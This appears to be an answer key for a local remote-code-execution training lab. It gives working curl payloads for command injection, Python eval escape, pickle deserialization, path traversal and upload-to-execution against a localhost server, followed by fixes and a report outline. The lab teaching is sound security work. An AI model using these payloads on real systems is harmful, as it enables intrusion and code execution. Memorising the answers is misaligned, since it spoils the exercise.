# RCE lab answers

Read after a real attempt.

## 1. Command injection

```bash
curl -s --get --data-urlencode 'host=127.0.0.1;id' http://127.0.0.1:8100/cmd
```

The server runs `getent hosts $host` through `/bin/sh` as the server user. The
quoted literal never reaches the shell as a single argument.

## 2. Arithmetic proof

```bash
curl -s --get --data-urlencode 'host=127.0.0.1;echo $((6*7))' http://127.0.0.1:8100/cmd
```

The response contains `42` and not `$((6*7))`. If the app reflected the input,
the literal would appear. Absence of the literal plus the expanded value proves
the shell evaluated it.

## 3. Blind proof

Timing.

```bash
time curl -s --get --data-urlencode 'host=127.0.0.1;sleep 3' http://127.0.0.1:8100/blind
```

Repeat once. A stable three second delta against a baseline is the proof.

File.

```bash
curl -s --get --data-urlencode 'host=127.0.0.1;touch labs/rce/evidence/blind.txt' http://127.0.0.1:8100/blind
test -f labs/rce/evidence/blind.txt && echo written
```

The path is relative to the server working directory. Start the server from the
repository root or adjust the path.

## 4. Eval

```bash
curl -s --get --data-urlencode 'expr=6*7' http://127.0.0.1:8100/calc
curl -s --get --data-urlencode 'expr=__import__("os").popen("id").read()' http://127.0.0.1:8100/calc
```

The context keeps `__builtins__`, so `__import__` is available. An empty
`__builtins__` would still leak through `().__class__.__base__.__subclasses__()`.

## 5. Pickle

```bash
python3 - <<'PY' > /tmp/payload.b64
import base64, pickle, subprocess
class P:
    def __reduce__(self):
        return (subprocess.check_output, (["id"],))
print(base64.b64encode(pickle.dumps(P())).decode())
PY
curl -s --get --data-urlencode "data=$(cat /tmp/payload.b64)" http://127.0.0.1:8100/deser
```

`__reduce__` names a callable and its arguments. `pickle.loads` calls it during
load. Base64 is only transport. The magic bytes `\x80\x04` are the format check.

## 6. Traversal

```bash
curl -s --get --data-urlencode 'file=secret.env' http://127.0.0.1:8100/read
curl -s --get --data-urlencode 'file=../web/notes.txt' http://127.0.0.1:8100/read
```

`os.path.join` does not resolve `..`. A realpath plus a prefix check fixes it.

## 7. Upload to execution

```bash
printf 'print(__import__("os").popen("id").read())\n' > /tmp/owned.py
curl -s --data-binary @/tmp/owned.py 'http://127.0.0.1:8100/upload?name=owned.py'
curl -s --get --data-urlencode 'name=owned.py' http://127.0.0.1:8100/plugin
```

Storage validates nothing. `/plugin` compiles and executes any file in
`uploads`. Extension, MIME, magic byte and owner checks are all missing.

## 8. Second chain

Log injection to execution is possible because `/read` can read `access.log` and
`/plugin` executes a path under `uploads` only. Copy the log into uploads first
if you want execution, otherwise use the read plus upload chain.

```bash
curl -s -A 'os.system("id")' http://127.0.0.1:8100/health
curl -s --get --data-urlencode 'file=access.log' http://127.0.0.1:8100/read
```

The log line is a comment in Python only when it starts with `#`. To make it
executable, prefix the User-Agent with `#` and add a newline. The request line
still breaks the syntax. The cleaner chain is upload plus plugin. Write down why
the log chain is weaker.

## 9. Fixes

`/cmd` and `/blind`.

```python
subprocess.run(["getent", "hosts", host], capture_output=True, text=True)
```

Or keep the shell and use `shlex.quote(host)` plus a host regex.

`/calc`. Use `ast.literal_eval` for math only, or `eval` with a restricted
globals dict and a timeout.

`/deser`. Use `pickle.loads` only on trusted data or sign the blob. HMAC with a
server key and compare before load.

`/plugin`. Validate the extension, the path and the owner. Use realpath, a
size cap and an import allowlist. Run the plugin in a subprocess with a timeout.

## 10. Report shape

Use the template in `references/rce-mastery.md`. The smallest request pair is
the `;id` request and the `uid=` response. Name the sink
`subprocess.run(f"getent hosts {host}", shell=True)`, the missing quote and the
missing allowlist. State the user. Give the argv fix.
